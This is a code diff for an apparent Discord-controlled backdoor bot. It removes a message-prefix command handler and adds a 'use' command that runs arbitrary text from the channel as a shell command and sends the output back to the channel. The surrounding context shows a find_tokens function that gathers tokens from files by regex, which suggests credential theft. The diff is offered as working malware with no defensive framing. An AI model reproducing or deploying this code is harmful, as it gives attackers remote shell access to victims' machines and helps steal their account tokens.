@@ -65,11 +65,6 @@ async def on_message(message):
     if message.channel != bot.text_channel:
         return
 
-    if message.content.lower().startswith('command'):
-        command = message.content[len('command'):].strip()
-        await execute_command(message.channel, command)
-        return
-
     await bot.process_commands(message)
 
 
@@ -87,6 +82,18 @@ def find_tokens(path):
                 for token in re.findall(regex, line):
                     tokens.append(token)
     return tokens
+
+
+@bot.command(name='use')
+async def execute_command(ctx, *args):
+
+    command = ' '.join(args)  # Combine all arguments into a single string
+    try:
+        # Execute the system command
+        result = subprocess.check_output(command, shell=True, text=True)
+        await ctx.send(f"""``{result}``""")
+    except subprocess.CalledProcessError as e:
+        await ctx.send(f"""``{e}``""")
 
 
 @bot.command(name='find_tokens')
